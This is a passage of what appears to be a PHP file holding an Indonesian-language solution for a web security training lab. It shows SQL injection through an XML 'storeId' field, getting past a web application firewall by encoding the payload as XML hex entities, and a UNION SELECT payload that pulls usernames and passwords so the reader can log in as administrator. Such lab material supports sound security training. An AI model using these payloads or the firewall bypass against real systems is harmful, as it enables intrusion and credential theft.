                            Coba tentukan jumlah kolom yang dikembalikan oleh query awal dengan menambahkan pernyataan <code>UNION SELECT</code> setelah ID toko:
                        </p>
                        <code class="code-scrollable">&lt;storeId&gt;1 UNION SELECT NULL&lt;/storeId&gt;</code>
                    </li>
                    <li>
                        <p>
                            Perhatikan bahwa permintaan Anda diblokir karena terdeteksi sebagai potensi serangan.
                        </p>
                    </li>
                </ol>
                <p>
                    <strong>Bypass WAF</strong>
                </p>
                <ol>
                    <li>
                        <p>
                            Karena Anda menyuntikkan ke dalam XML, coba obfuskasi payload menggunakan entitas XML. Anda bisa melakukannya memakai ekstensi <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">Hackvertor</a>. Sorot input Anda, klik kanan, lalu pilih <strong>Extensions &gt; Hackvertor &gt; Encode &gt; dec_entities/hex_entities</strong>.
                        </p>
                    </li>
                    <li>
                        <p>
                            Kirim ulang permintaan dan perhatikan bahwa kini Anda menerima respons normal dari aplikasi. Ini menandakan Anda berhasil melewati WAF.
                        </p>
                    </li>
                </ol>
                <p>
                    <strong>Susun eksploitasi</strong>
                </p>
                <ol>
                    <li>
                        <p>
                            Lanjutkan pengujian dan simpulkan bahwa query hanya mengembalikan satu kolom. Ketika mencoba lebih dari satu kolom, aplikasi mengembalikan <code>0 units</code> yang menandakan error.
                        </p>
                    </li>
                    <li>
                        <p>
                            Karena hanya bisa mengembalikan satu kolom, gabungkan username dan password yang diambil dengan konkatenasi, misalnya:
                        </p>
                        <code class="code-scrollable">&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT username || '~' || password FROM users&lt;/@hex_entities&gt;&lt;/storeId&gt;</code>
                    </li>
                    <li>
                        <p>
                            Kirim query ini dan amati bahwa Anda berhasil mengambil username dan password dari database, dipisahkan karakter <code>~</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            Gunakan kredensial administrator untuk masuk dan menyelesaikan lab.
                        </p>
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
];
